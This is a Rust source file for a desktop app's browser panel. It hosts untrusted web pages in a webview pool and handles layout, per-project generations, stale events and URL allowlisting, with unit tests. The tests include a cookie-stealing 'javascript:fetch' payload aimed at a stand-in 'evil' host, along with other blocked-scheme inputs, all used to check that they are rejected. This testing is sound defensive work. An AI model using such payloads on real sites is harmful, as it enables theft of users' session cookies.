//! 浏览器面板的原生层:把库的页签清单交给 bytehost 的 `WebPool`(不可信页面的多页签子视图池)去承载。
//!
//! 池自己持有全部 wry 句柄;这里只做产品的那一半:
//! - **几何**:网页放在页签栏 + 地址栏之下,高度只认库转发的 [`chrome_top_px`](dozer_panel_browser::chrome_top_px),
//!   左右下边距取自视图用的同一份区域样式,收藏夹侧栏展开时让出它的宽度;
//! - **生命周期**:一个项目一代(`generation`),换项目就整池销毁重建(页签 id 是每个 `Tabs` 自己的计数器,
//!   跨项目会撞号);面板不可见 / 有 iced 浮层时只是**停放**(隐藏,页面与滚动位置保留);
//! - **事件**:每个事件带代号,过期的(切项目、关项目之后迟到的)一律丢掉,不改任何状态。
//!
//! 不向页面注入任何脚本,也不装 IPC:页面看不到宿主。
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::mpsc::channel;

use bytehost_chrome::Rect;
use bytehost_core::LogicalRect;
use bytehost_desktop::native_child::Probe;
use bytehost_desktop::web_child::{WebEvent, WebNav, WebPool, WebTabSpec};
use bytehost_webview::browse::allows_new_tab;
use dozer_panel_browser::{Message, NavAction, chrome_top_px};
use iced::{Padding, Task, window};

/// 收藏夹侧栏竖分隔线的宽度(与 `byteui::layout::divider::vertical` 的 1px 线同值)。
const DIVIDER_WIDTH: f32 = 1.0;

/// 收藏夹侧栏展开时的布局(与库视图里的 `FillPortion` 分法同式)。
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct Sidebar {
    /// 网页区占扣掉分隔线后宽度的比例。
    pub content_fraction: f32,
    /// 镜像:收藏夹在网页**前面**(左边)。
    pub mirrored: bool,
}

/// 网页子视图的矩形(逻辑像素,窗口坐标)。`content` 是骨架给的面板内容矩形;`pad` 是视图用的区域内边距;
/// `above` 是页签栏上方额外占的高度(提示条)。**页签栏 + 地址栏的高度只读 `chrome_top_px()`**。
pub fn webview_rect(content: Rect, pad: Padding, above: f32, sidebar: Option<Sidebar>) -> Rect {
    let top = chrome_top_px() + above.max(0.);
    let inner_w = (content.w - pad.left - pad.right).max(0.);
    let (offset, width) = match sidebar {
        None => (0., inner_w),
        Some(side) => {
            let avail = (inner_w - DIVIDER_WIDTH).max(0.);
            let web = avail * side.content_fraction.clamp(0., 1.);
            let offset = if side.mirrored {
                avail - web + DIVIDER_WIDTH
            } else {
                0.
            };
            (offset, web)
        }
    };
    Rect {
        x: content.x + pad.left + offset,
        y: content.y + top,
        w: width,
        h: (content.h - top - pad.bottom).max(0.),
    }
}

/// 本帧期望的原生状态(纯数据)。
#[derive(Debug, Clone)]
pub struct Desired {
    /// 有当前项目且没在关闭;`None` 销毁全部。
    pub project_id: Option<i64>,
    /// 面板可见、窗口没最小化。
    pub shown: bool,
    /// 有 iced 浮层会被 webview 盖住:停放并隐藏(原生菜单是独立窗口,不算)。
    pub overlay_open: bool,
    pub rect: LogicalRect,
    pub tabs: Vec<WebTabSpec>,
}

/// 隐藏条件:不可见、有浮层、或骨架给了"不可用"的 1px 占位矩形。
fn tabs_for(d: &Desired) -> Vec<WebTabSpec> {
    let show = d.shown && !d.overlay_open && d.rect.width > 1. && d.rect.height > 1.;
    d.tabs
        .iter()
        .map(|t| WebTabSpec {
            visible: t.visible && show,
            ..t.clone()
        })
        .collect()
}

#[derive(Debug, Clone, PartialEq)]
pub enum Prepared {
    Idle,
    Destroy,
    Sync {
        generation: u64,
        tabs: Vec<WebTabSpec>,
    },
}

#[derive(Debug, Clone)]
pub enum Event {
    Web(WebEvent),
    Synced,
    Failed(u64, String),
    Probed(u64, usize, Probe),
}

/// 事件对宿主的含义。(库的 `Message` 没有 `PartialEq`,测试里比较它的 `Debug` 形式。)
#[derive(Debug, Clone)]
pub enum Outcome {
    /// 交给库 `update` 的消息(项目 id 是**这一代所属**的项目,不是此刻聚焦的项目)。
    Lib(i64, Message),
    /// 要给用户看的一行提示。
    Notice(String),
}

pub struct BrowserNative {
    pool: WebPool,
    epoch: Arc<AtomicU64>,
    generation: u64,
    live: Option<i64>,
    last_probe: Option<Probe>,
    rx: Option<tokio::sync::mpsc::UnboundedReceiver<Event>>,
}

impl Default for BrowserNative {
    fn default() -> Self {
        Self::new()
    }
}

impl BrowserNative {
    pub fn new() -> Self {
        let (web_tx, web_rx) = channel();
        let (tx, rx) = tokio::sync::mpsc::unbounded_channel();
        // 池的事件走标准库通道(wry 回调在主线程、不能 await);转进 iced 的流需要一个小桥线程。
        // 池被丢弃、发送端关闭时线程自然结束。
        std::thread::spawn(move || {
            while let Ok(event) = web_rx.recv() {
                if tx.send(Event::Web(event)).is_err() {
                    break;
                }
            }
        });
        let epoch = Arc::new(AtomicU64::new(0));
        Self {
            pool: WebPool::new(epoch.clone(), web_tx),
            epoch,
            generation: 0,
            live: None,
            last_probe: None,
            rx: Some(rx),
        }
    }

    pub fn take_receiver(&mut self) -> Option<tokio::sync::mpsc::UnboundedReceiver<Event>> {
        self.rx.take()
    }

    #[cfg(test)]
    pub(crate) fn generation_for_tests(&self) -> u64 {
        self.generation
    }

    pub fn last_probe(&self) -> Option<Probe> {
        self.last_probe
    }

    /// 开新的一代:此前所有在途任务与事件作废。
    fn bump(&mut self) -> u64 {
        self.generation += 1;
        self.epoch.store(self.generation, Ordering::SeqCst);
        self.generation
    }

    /// 决定这一帧要对池做什么(纯状态机,不碰 wry)。
    pub fn prepare(&mut self, d: &Desired) -> Prepared {
        match d.project_id {
            None => {
                if self.live.take().is_some() {
                    self.bump();
                    Prepared::Destroy
                } else {
                    Prepared::Idle
                }
            }
            Some(pid) => {
                if self.live != Some(pid) {
                    self.bump();
                    self.live = Some(pid);
                }
                Prepared::Sync {
                    generation: self.generation,
                    tabs: tabs_for(d),
                }
            }
        }
    }

    pub fn sync(&mut self, id: window::Id, d: Desired) -> Task<Event> {
        match self.prepare(&d) {
            Prepared::Idle => Task::none(),
            Prepared::Destroy => self.pool.destroy_all(id, Event::Synced),
            Prepared::Sync { generation, tabs } => self.pool.sync(
                id,
                generation,
                tabs,
                d.rect,
                f64::from(byteui::theme::icon_size::scale()),
                move |error| Event::Failed(generation, error),
                Event::Synced,
            ),
        }
    }

    /// 对激活页签发后退 / 前进 / 刷新(没有活着的这一代就什么都不做)。
    pub fn nav(&self, id: window::Id, tab: usize, action: NavAction) -> Task<Event> {
        if self.live.is_none() {
            return Task::none();
        }
        let nav = match action {
            NavAction::Back => WebNav::Back,
            NavAction::Forward => WebNav::Forward,
            NavAction::Refresh => WebNav::Refresh,
        };
        self.pool.nav(id, self.generation, tab, nav, Event::Synced)
    }

    /// 在激活页签的页面里查找(命中即选中并滚动过去,恒回绕);结果稍后作为 `WebEvent::FindResult` 回来。
    pub fn find(&self, id: window::Id, tab: usize, query: String, backwards: bool) -> Task<Event> {
        if self.live.is_none() {
            return Task::none();
        }
        self.pool
            .find_task(id, self.generation, tab, query, backwards, Event::Synced)
    }

    /// 关掉查找条 / 清空查找词:清掉页面里的命中选区。
    pub fn clear_find(&self, id: window::Id, tab: usize) -> Task<Event> {
        if self.live.is_none() {
            return Task::none();
        }
        self.pool
            .clear_find_task(id, self.generation, tab, Event::Synced)
    }

    /// 把等得太久的导航报出来(宿主的定时 tick 里调)。
    pub fn poll_stalled(&self) {
        self.pool.poll_stalled(std::time::Instant::now());
    }

    pub fn probe(&self, id: window::Id, tab: usize) -> Task<Event> {
        let generation = self.generation;
        self.pool.probe(id, generation, tab, move |probe| {
            Event::Probed(generation, tab, probe)
        })
    }

    /// 校验并翻译一个事件。不属于当前这一代(或没有活着的项目)的一律丢弃。
    pub fn update(&mut self, event: Event) -> Option<Outcome> {
        let pid = self.live?;
        match event {
            Event::Probed(generation, _, probe) => {
                if generation == self.generation {
                    self.last_probe = Some(probe);
                }
                None
            }
            Event::Synced => None,
            Event::Failed(generation, error) => (generation == self.generation)
                .then(|| Outcome::Notice(format!("网页视图出错:{error}"))),
            Event::Web(web) => match web {
                WebEvent::PageLoaded {
                    generation,
                    id,
                    url,
                } if generation == self.generation => {
                    Some(Outcome::Lib(pid, Message::Loaded(id, url)))
                }
                WebEvent::TitleChanged {
                    generation,
                    id,
                    title,
                } if generation == self.generation => {
                    Some(Outcome::Lib(pid, Message::TitleLoaded(id, title)))
                }
                // 池已经按白名单放行过;这里再确认一次(纵深防御),不过的静默丢掉。
                WebEvent::NewTabRequested { generation, url }
                    if generation == self.generation && allows_new_tab(&url) =>
                {
                    Some(Outcome::Lib(pid, Message::OpenUrl(url)))
                }
                WebEvent::FindResult {
                    generation,
                    query,
                    matched,
                    ..
                } if generation == self.generation => {
                    Some(Outcome::Lib(pid, Message::FindResult(query, matched)))
                }
                WebEvent::NavigationStalled {
                    generation, url, ..
                } if generation == self.generation => Some(Outcome::Notice(format!(
                    "页面没有响应,无法打开:{}",
                    shorten(&url)
                ))),
                WebEvent::NavigationBlocked {
                    generation, url, ..
                } if generation == self.generation => Some(Outcome::Notice(format!(
                    "不支持打开这类网址({})",
                    scheme_of(&url)
                ))),
                _ => None,
            },
        }
    }
}

/// 提示里的网址最多留这么多字符(查询串可能很长,也可能带令牌)。
const NOTICE_URL_CHARS: usize = 80;

fn shorten(url: &str) -> String {
    let head: String = url.chars().take(NOTICE_URL_CHARS).collect();
    if url.chars().count() > NOTICE_URL_CHARS {
        format!("{head}…")
    } else {
        head
    }
}

/// 只报 scheme,不回显网址其余部分(`javascript:` 后面可能是一大段代码)。
fn scheme_of(url: &str) -> String {
    match url.split_once(':') {
        Some((scheme, _))
            if !scheme.is_empty()
                && scheme.len() <= 16
                && scheme
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.')) =>
        {
            format!("{}:", scheme.to_ascii_lowercase())
        }
        _ => "无法识别".to_owned(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn native() -> BrowserNative {
        BrowserNative::new()
    }

    /// 比较 `Option<Outcome>` 的 `Debug` 形式。
    fn is(actual: Option<Outcome>, expected: Option<Outcome>) {
        assert_eq!(format!("{actual:?}"), format!("{expected:?}"));
    }

    fn rect() -> LogicalRect {
        LogicalRect {
            x: 10.,
            y: 20.,
            width: 400.,
            height: 300.,
        }
    }

    fn desired(project: Option<i64>, shown: bool, overlay: bool) -> Desired {
        Desired {
            project_id: project,
            shown,
            overlay_open: overlay,
            rect: rect(),
            tabs: vec![
                WebTabSpec {
                    id: 1,
                    url: "https://a.com/".into(),
                    visible: false,
                },
                WebTabSpec {
                    id: 2,
                    url: "https://b.com/".into(),
                    visible: true,
                },
            ],
        }
    }

    fn visible_ids(p: &Prepared) -> Vec<usize> {
        match p {
            Prepared::Sync { tabs, .. } => {
                tabs.iter().filter(|t| t.visible).map(|t| t.id).collect()
            }
            other => panic!("expected a sync, got {other:?}"),
        }
    }

    fn pad() -> Padding {
        Padding {
            top: 8.,
            right: 8.,
            bottom: 12.,
            left: 8.,
        }
    }

    fn content() -> Rect {
        Rect {
            x: 100.,
            y: 50.,
            w: 500.,
            h: 600.,
        }
    }

    /// 网页的矩形:`y = 内容.y + chrome_top_px()`,下边距与左右边距取区域内边距;缩放 1 与 2 都成立。
    #[test]
    fn webview_rect_insets_by_chrome_top_px_and_margins() {
        let before = byteui::theme::icon_size::scale();
        for scale in [1., 2.] {
            byteui::theme::icon_size::set_scale(scale);
            let chrome = chrome_top_px();
            let r = webview_rect(content(), pad(), 0., None);
            assert_eq!(r.x, 100. + 8.);
            assert_eq!(r.y, 50. + chrome);
            assert_eq!(r.w, 500. - 16.);
            assert_eq!(r.h, 600. - chrome - 12.);
        }
        byteui::theme::icon_size::set_scale(before);
    }

    #[test]
    fn webview_rect_is_never_negative_for_tiny_panels() {
        let tiny = Rect {
            x: 0.,
            y: 0.,
            w: 5.,
            h: 5.,
        };
        let r = webview_rect(tiny, pad(), 30., None);
        assert!(r.w >= 0. && r.h >= 0. && r.w.is_finite() && r.h.is_finite());
        let side = Sidebar {
            content_fraction: 0.72,
            mirrored: true,
        };
        let r = webview_rect(tiny, pad(), 0., Some(side));
        assert!(r.w >= 0. && r.h >= 0.);
    }

    /// 侧栏展开:网页让出侧栏宽度;镜像时侧栏在网页前面,网页整体右移。
    #[test]
    fn the_sidebar_takes_width_from_the_page_on_the_side_it_is_drawn() {
        let plain = webview_rect(content(), pad(), 0., None);
        let side = |mirrored| Sidebar {
            content_fraction: 0.5,
            mirrored,
        };
        let right = webview_rect(content(), pad(), 0., Some(side(false)));
        let left = webview_rect(content(), pad(), 0., Some(side(true)));
        assert_eq!(right.x, plain.x, "侧栏在网页后面:网页起点不动");
        assert_eq!(right.w, left.w);
        assert!(right.w < plain.w);
        // 网页 + 分隔线 + 侧栏正好铺满内宽。
        let avail = plain.w - DIVIDER_WIDTH;
        assert_eq!(right.w, avail * 0.5);
        assert_eq!(left.x, plain.x + (avail - left.w) + DIVIDER_WIDTH);
        assert!(left.x + left.w <= plain.x + plain.w + 0.001);
    }

    #[test]
    fn a_notice_above_the_chrome_pushes_the_page_down() {
        let plain = webview_rect(content(), pad(), 0., None);
        let with = webview_rect(content(), pad(), 24., None);
        assert_eq!(with.y, plain.y + 24.);
        assert_eq!(with.h, plain.h - 24.);
    }

    /// 钉死:高度只读库转发的 `chrome_top_px()`,生产源码里没有手写的像素常数(同 Dozer 的几何钉死测试)。
    #[test]
    fn geometry_reads_only_chrome_top_px_and_has_no_pixel_constants() {
        let src = include_str!("browser_native.rs");
        let prod = &src[..src.find("#[cfg(test)]").unwrap()];
        let geometry =
            &prod[prod.find("pub fn webview_rect").unwrap()..prod.find("/// 本帧期望").unwrap()];
        assert!(geometry.contains("chrome_top_px()"));
        for constant in ["72.", "8.0", "16.0", "28.", "40.", "browser_chrome_top_px"] {
            assert!(!geometry.contains(constant), "几何里不得出现 {constant}");
        }
    }

    #[test]
    fn hidden_when_panel_not_visible() {
        let mut n = native();
        let p = n.prepare(&desired(Some(1), false, false));
        assert!(visible_ids(&p).is_empty());
        let Prepared::Sync { tabs, .. } = p else {
            unreachable!()
        };
        assert_eq!(tabs.len(), 2, "停放:页签仍在,只是不可见");
    }

    #[test]
    fn the_active_tab_is_the_only_visible_one_when_shown() {
        let mut n = native();
        assert_eq!(visible_ids(&n.prepare(&desired(Some(1), true, false))), [2]);
    }

    #[test]
    fn iced_overlays_hide_the_webview_but_native_menus_do_not() {
        let mut n = native();
        assert!(visible_ids(&n.prepare(&desired(Some(1), true, true))).is_empty());
        // 原生菜单是独立窗口、天然盖在 webview 上:`overlay_open` 不会为它置位,网页保持可见。
        assert_eq!(visible_ids(&n.prepare(&desired(Some(1), true, false))), [2]);
    }

    #[test]
    fn an_unusable_one_pixel_rect_never_shows_a_child() {
        let mut n = native();
        let mut d = desired(Some(1), true, false);
        d.rect = LogicalRect {
            x: 0.,
            y: 0.,
            width: 1.,
            height: 1.,
        };
        assert!(visible_ids(&n.prepare(&d)).is_empty());
    }

    /// 离开面板只是停放(同一代,不销毁、不重建),回来就是同一批页面。
    #[test]
    fn leaving_the_panel_parks_every_webview_in_the_same_generation() {
        let mut n = native();
        let shown = n.prepare(&desired(Some(1), true, false));
        let hidden = n.prepare(&desired(Some(1), false, false));
        let back = n.prepare(&desired(Some(1), true, false));
        let gen_of = |p: &Prepared| match p {
            Prepared::Sync { generation, .. } => *generation,
            _ => panic!(),
        };
        assert_eq!(gen_of(&shown), gen_of(&hidden));
        assert_eq!(gen_of(&shown), gen_of(&back));
    }

    #[test]
    fn project_switch_destroys_the_previous_projects_webviews() {
        let mut n = native();
        let a = n.prepare(&desired(Some(1), true, false));
        let b = n.prepare(&desired(Some(2), true, false));
        let a_back = n.prepare(&desired(Some(1), true, false));
        let gen_of = |p: &Prepared| match p {
            Prepared::Sync { generation, .. } => *generation,
            _ => panic!(),
        };
        // 换项目 = 新的一代(池据此整池销毁重建);换回来也是新的一代,不复用旧页面。
        assert_ne!(gen_of(&a), gen_of(&b));
        assert_ne!(gen_of(&b), gen_of(&a_back));
        assert_ne!(gen_of(&a), gen_of(&a_back));
    }

    #[test]
    fn no_project_destroys_once_and_then_stays_idle() {
        let mut n = native();
        assert_eq!(n.prepare(&desired(None, true, false)), Prepared::Idle);
        n.prepare(&desired(Some(1), true, false));
        assert_eq!(n.prepare(&desired(None, true, false)), Prepared::Destroy);
        assert_eq!(n.prepare(&desired(None, true, false)), Prepared::Idle);
    }

    /// 关掉最后一个页签时库回落成一个 `about:blank`:清单里仍然有恰好一个页签,池里就还有一个视图。
    #[test]
    fn closing_the_last_tab_keeps_one_blank_webview() {
        let mut state = dozer_panel_browser::State::default();
        state.close_tab(0);
        let specs = state.desired_webviews();
        assert_eq!(specs.len(), 1);
        assert_eq!(specs[0].url, "about:blank");
        assert!(specs[0].visible);
    }

    #[test]
    fn stale_generation_events_are_ignored() {
        let mut n = native();
        n.prepare(&desired(Some(1), true, false));
        let old = n.generation;
        n.prepare(&desired(Some(2), true, false));
        let loaded = |generation| {
            Event::Web(WebEvent::PageLoaded {
                generation,
                id: 1,
                url: "https://a.com/".into(),
            })
        };
        is(n.update(loaded(old)), None);
        is(
            n.update(loaded(n.generation)),
            Some(Outcome::Lib(2, Message::Loaded(1, "https://a.com/".into()))),
        );
        // 项目关闭之后(没有活着的一代):什么事件都不认。
        n.prepare(&desired(None, true, false));
        is(n.update(loaded(n.generation)), None);
    }

    #[test]
    fn page_loaded_becomes_loaded_and_title_changed_becomes_title_loaded() {
        let mut n = native();
        n.prepare(&desired(Some(7), true, false));
        let g = n.generation;
        is(
            n.update(Event::Web(WebEvent::PageLoaded {
                generation: g,
                id: 3,
                url: "https://x.com/".into(),
            })),
            Some(Outcome::Lib(7, Message::Loaded(3, "https://x.com/".into()))),
        );
        is(
            n.update(Event::Web(WebEvent::TitleChanged {
                generation: g,
                id: 3,
                title: "X".into(),
            })),
            Some(Outcome::Lib(7, Message::TitleLoaded(3, "X".into()))),
        );
    }

    #[test]
    fn new_tab_request_becomes_open_url_only_if_allowed() {
        let mut n = native();
        n.prepare(&desired(Some(7), true, false));
        let g = n.generation;
        let request = |url: &str| {
            Event::Web(WebEvent::NewTabRequested {
                generation: g,
                url: url.into(),
            })
        };
        is(
            n.update(request("https://x.com/new")),
            Some(Outcome::Lib(
                7,
                Message::OpenUrl("https://x.com/new".into()),
            )),
        );
        for bad in [
            "javascript:alert(1)",
            "data:text/html,x",
            "dozer://a/b",
            "file://share/x",
        ] {
            is(n.update(request(bad)), None);
        }
    }

    #[test]
    fn stalled_and_blocked_navigations_become_short_notices() {
        let mut n = native();
        n.prepare(&desired(Some(7), true, false));
        let g = n.generation;
        let long = format!("https://example.com/{}", "a".repeat(500));
        let Some(Outcome::Notice(text)) = n.update(Event::Web(WebEvent::NavigationStalled {
            generation: g,
            id: 1,
            url: long,
        })) else {
            panic!("notice")
        };
        assert!(text.chars().count() < 140, "{text}");
        assert!(text.ends_with('…'));
        let Some(Outcome::Notice(text)) = n.update(Event::Web(WebEvent::NavigationBlocked {
            generation: g,
            id: 1,
            url: "javascript:fetch('https://evil/'+document.cookie)".into(),
        })) else {
            panic!("notice")
        };
        assert!(text.contains("javascript:"));
        assert!(!text.contains("evil"), "不回显网址其余部分: {text}");
    }

    #[test]
    fn a_stale_probe_never_overwrites_the_latest_one() {
        let mut n = native();
        n.prepare(&desired(Some(1), true, false));
        let g = n.generation;
        let probe = |handles| Probe {
            exists: true,
            visible: true,
            bounds: None,
            handles,
        };
        n.update(Event::Probed(g, 1, probe(3)));
        n.update(Event::Probed(g - 1, 1, probe(99)));
        assert_eq!(n.last_probe().unwrap().handles, 3);
    }

    /// 查找结果带着当时的查找词回到库(库据此丢弃慢的旧结果);过期代号的结果丢掉。
    #[test]
    fn a_find_result_becomes_the_librarys_message_and_a_stale_one_is_dropped() {
        let mut n = native();
        n.prepare(&desired(Some(4), true, false));
        let g = n.generation;
        let result = |generation| {
            Event::Web(WebEvent::FindResult {
                generation,
                id: 1,
                query: "needle".into(),
                matched: false,
            })
        };
        is(
            n.update(result(g)),
            Some(Outcome::Lib(4, Message::FindResult("needle".into(), false))),
        );
        is(n.update(result(g - 1)), None);
    }
}
